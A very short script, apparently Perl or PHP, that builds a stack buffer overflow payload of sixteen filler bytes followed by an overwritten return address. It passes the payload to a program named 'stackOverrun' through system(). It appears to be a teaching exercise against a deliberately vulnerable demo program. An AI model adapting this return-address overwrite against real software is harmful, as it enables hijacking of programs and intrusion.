$arg = "ABCDEFGHIJKLMNOP"."\x90\x11\x40";
$cmd = "stackOverrun ".$arg;

system($cmd);

